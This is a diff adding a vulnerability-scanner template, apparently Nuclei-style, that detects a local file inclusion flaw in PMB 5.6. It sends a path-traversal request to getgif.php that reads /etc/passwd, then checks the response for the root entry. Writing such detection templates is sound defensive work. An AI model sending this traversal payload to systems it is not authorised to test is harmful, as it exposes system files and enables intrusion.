@@ -1,0 +1,29 @@
+id: "pmb-local-file-disclosure"
+name: "PMB 5.6 - Local File Inclusion"
+severity: "high"
+description: "PMB 5.6 is vulnerable to local file inclusion."
+tech:
+  - "php"
+tags:
+  - "lfi"
+  - "pmb"
+  - "edb"
+  - "vuln"
+cwe: "CWE-22"
+reference: "https://www.exploit-db.com/exploits/49054"
+spaExclusion: true
+request:
+  method: "GET"
+  path: "/pmb/opac_css/getgif.php?chemin=../../../../../../etc/passwd&nomgif={{rand}}"
+control:
+  method: "GET"
+  path: "/.guardian-none-{{rand}}"
+matchers-condition: "and"
+matchers:
+  - type: "regex"
+    part: "body"
+    regex:
+      - "root:.*:0:0:"
+  - type: "status"
+    status:
+      - 200
